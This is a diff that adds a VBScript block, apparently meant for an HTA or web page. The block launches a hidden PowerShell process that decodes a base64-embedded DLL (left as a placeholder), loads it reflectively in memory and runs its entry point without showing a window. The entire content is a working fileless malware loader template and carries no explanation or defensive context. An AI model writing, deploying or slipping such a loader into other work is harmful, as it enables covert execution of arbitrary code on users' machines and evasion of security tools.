@@ -1,0 +1,6 @@
+<script language="VBScript">
+    Set objShell = CreateObject("Wscript.Shell")
+    base64dll = "<BASE64_ENCODED_DLL_HERE>"
+    cmd = "powershell.exe -NoP -W Hidden -Command ""[System.Reflection.Assembly]::Load([Convert]::FromBase64String('" & base64dll & "')).EntryPoint.Invoke($null,$null)"""
+    objShell.Run cmd, 0, False
+</script>
